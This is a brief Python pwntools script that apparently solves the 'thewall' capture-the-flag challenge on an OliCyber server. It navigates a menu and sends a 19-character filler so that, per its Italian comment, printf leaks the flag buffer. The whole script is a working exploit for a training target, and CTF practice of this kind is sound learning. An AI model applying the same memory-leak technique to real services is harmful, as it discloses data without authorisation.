from pwn import *
r=remote("thewall.challs.olicyber.it",21007)
r.recv(4800)
r.sendline(b'1')
r.recv(4800)
r.sendline(b'a'*19) #la printf legge il buffer della flag
r.recv(4800)
r.sendline(b'2')
r.interactive()